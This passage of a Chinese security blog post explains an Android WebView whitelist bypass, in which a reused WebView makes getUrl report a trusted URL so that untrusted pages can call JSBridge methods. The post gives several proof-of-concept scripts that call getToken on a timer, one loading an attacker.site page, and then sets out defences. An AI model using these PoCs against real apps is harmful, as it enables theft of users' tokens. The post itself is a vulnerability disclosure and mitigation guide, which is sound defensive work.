+<p>poc:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// will call WebView.loadUrl internal</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">browser_navigation</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">//fallback_url is in WhiteList</span></span></span><br><span class="line"><span class="javascript">      location.href = <span class="string">"protocol://app.pattern/?fallback_url=http%3A//www.google.com"</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.JSBridge.getToken();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  setTimeout(getToken,<span class="number">400</span>);  <span class="comment">// time delay attack</span></span></span><br><span class="line">  browser_navigation();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这种情况也是业务中最常出现的问题，业务代码可能出于各种各样的考虑就在某个角落里添加了这样一条逻辑，也就有可能出现问题。</p>
+<h2 id="Shared-Navigation-Confused-Attack"><a href="#Shared-Navigation-Confused-Attack" class="headerlink" title="Shared Navigation Confused Attack"></a>Shared Navigation Confused Attack</h2><p>WebView 常用的加载页面方式只有 <code>WebWiew.loadUrl</code> 一种，因此通常情况下业务都是使用这个方式加载页面。 如果加载页面的 WebView 存在复用的场景，也会触发这个问题。</p>
+<p>举例来说，业务通过 scheme 暴露了一个外部页面加载能力，外部通过链接 <code>huaweilalala://toWebVIew/?url=http:xxxxxxxxx</code> 就可以拉起组件 <code>WebviewLoadActivity</code>，并渲染页面 <code>http:xxxxxxxxx</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".WebviewLoadActivity"</span> <span class="attr">android:launchMode</span>=<span class="string">"singleTask"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"huaweilalala"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于 WebviewLoadActivity 类的启动模式设置为了 singleTask ，因此已有的 WebView 组件会被复用，从而会在当前正在执行的 WebView 对象上执行 <code>loadUrl</code>, 触发 browser-initiate-navigation，修改 WebView 中的 <code>pending_entry_</code> ，使 <code>WebWiew.getUrl</code> 返回错误的值，绕过白名单校验。</p>
+<p>poc<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// will call WebView.loadUrl internal</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">browser_navigation</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">   location.href = <span class="string">"hualalala://openPage?url=www.google.com"</span>;  <span class="comment">// load a url in white list</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.JSBridge.getToken();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  setTimeout(getToken,<span class="number">400</span>);    <span class="comment">// time delay attack</span></span></span><br><span class="line">  browser_navigation();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>有的业务可能本身不支持 deeplink 调用，那么我们的 poc 就需要改一些，还需要一个第三方浏览器的协助。</p>
+<p>下面的 poc 通过第三方浏览器加载（夸克浏览器）可以实现攻击。注册事件 <code>visibilitychange</code>，这个事件会在页面出现或者隐藏时触发。当浏览器通过 deeplink 拉起目标应用时页面会被隐藏，从而触发 <code>visibilitychange</code> 事件，通过这个和机制我们就可以连续的触发两次 deeplink，强制应用在同一个 webview 对象中加载两个不同的 URL，从而也达到了延时攻击的效果。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// The event is fired at the document when the content of its tab have become visible or have been hidden.</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">if</span>(<span class="built_in">document</span>.visibilityState == <span class="string">'hidden'</span>) &#123;</span></span><br><span class="line">       setTimeout(bypass, 3000);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript"><span class="comment">// will launch target WebView and fire visibilitychange</span></span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">   img.src= <span class="string">"hualalala://openPage/?=https://www.attacker.site"</span>; <span class="comment">// load a page to call JavascriptInterface directly</span></span></span><br><span class="line"><span class="javascript">   <span class="built_in">document</span>.body.appendChild(img);</span></span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">   img.src= <span class="string">"hualalala://openPage/?url=https%3A//www.google.com"</span>; <span class="comment">// load a white list url to bypass verification</span></span></span><br><span class="line"><span class="javascript">   <span class="built_in">document</span>.body.appendChild(img);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>除了以上两种，有时候业务会出于自身的性能考虑，采用单例模式创建 webview 对象，这样也会导致漏洞的产生。</p>
+<p>这种情况隐藏的很深，因此也比较难发现，需要仔细排查。</p>
+<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><p>这个漏洞本质上还是开发者对组件理解不够深刻导致的，在 android 的开发文档中明确的指出了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because the object is exposed to all the frames, any frame could obtain the object name and call methods on it. There is no way to tell the calling frame&apos;s origin from the app side, so the app must not assume that the caller is trustworthy unless the app can guarantee that no third party content is ever loaded into the WebView even inside an iframe.</span><br></pre></td></tr></table></figure>
+<p>因此最好的方法就是按照文档说明，不要在不受信任的页面上提供 JavascriptInterface。</p>
+<p>对于那些已经发布的业务我们也提供了两套解决方法。</p>
+<p>其一：走读代码，排查上文中描述的三种漏洞模式，并针对性修改。确保 loadUrl 方法不会被 js 访问。</p>
+<p>其二：从底层着手，为 JsBridge 提供可信的 url 获取方法。HwWebView 已经实现了相关方案。该方案在 JsBridge 中实现了额外的接口调用 <code>securityExtSetFrameUrl</code>，网页JS通过name调用java object的任何方法前，都会通过securityExtSetFrameUrl 这个，将url通知上去。由于该操作是由 Webview 底层直接发起的，因此可以信任之。</p>
+<p>使用方法：</p>
+<ol>
+<li><p>在要添加的 Java 对象上实现接口 securityExtSetFrameUrl</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JsObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String currentUrl;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">securityExtSetFrameUrl</span> <span class="params">(string url)</span></span>&#123;</span><br><span class="line">           currentUrl = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        …..</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function">Public string <span class="title">getToken</span><span class="params">()</span></span>&#123;</span><br><span class="line">           CheckPermission(currentUrl);</span><br><span class="line">           <span class="comment">//…..</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在二层白名单校验处使用 securityExtSetFrameUrl 设置的 Url 来做校验</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Public string <span class="title">CheckPermission</span> <span class="params">(string url)</span></span>&#123;</span><br><span class="line">isInWhiteList(currentUrl);</span><br><span class="line"><span class="comment">// ….</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>这个问题有三点很值得我们思考。</p>
+<p>其一：一些我们常用的来自底层的方法是否完全可信，在使用这些方法或者组件之前有没有仔细的阅读官方提供的文档。这个漏洞和之前的“应用克隆攻击”其实都是开发者对文档阅读不细致，理解不到位导致的。</p>
+<p>其二： 由于 WebView 的这个特点，端侧其实很容易遭受 spoofing 攻击，因为对于使用 WebView 的应用来说他们无法保证获得的 URL 是准确的，这样一来也就违反了 chromium 中相关代码的设计初衷。一些端侧看起来很容易满足的条件，再其他平台上可能就不是这样。</p>
+<p>其三：这个问题其实同样可能出现在其他基于 chromium 的框架中，比如 PC 端的 electron 和 libcef。更有甚者在 IOS 系统上也有可能出现同类问题</p>
+<p>最后感谢朱小龙在过程中给与的支持。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://mohamoha.club/2021/05/30/JavascriptInterface_once_more/" data-id="ckqyxnmct000ehkuqlvlgvynb" class="article-share-link">Share</a>
+      
+        <a href="http://mohamoha.club/2021/05/30/JavascriptInterface_once_more/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/30/IDEA/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">后反序列化攻击调试中的IDE</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/30/JavascriptInterface_once_more/">JavaScriptInterface Once More</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/30/IDEA/">后反序列化攻击调试中的IDE</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/16/chrome_dead_lock/">解决 Chrome 启动进程卡顿问题</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/14/Link_file_and_sdcard/">Link File and Sdcard in Android</a>
+          </li>
+        
+          <li>
+            <a href="/2019/01/06/AST_Fuzzer/">AST Fuzz —— a New Kind of Fuzzer</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget tag">
+    <h3 class="title">Site Links</h3>
+    <ul class="entry">
+    <li><a href="http://5alt.me" title="5alt">5alt's Blog</a></li>
+    </ul>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 mohaplus<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="https://github.com" class="mobile-nav-link">github</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'mohamoha';
+  
+  var disqus_url = 'http://mohamoha.club/2021/05/30/JavascriptInterface_once_more/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
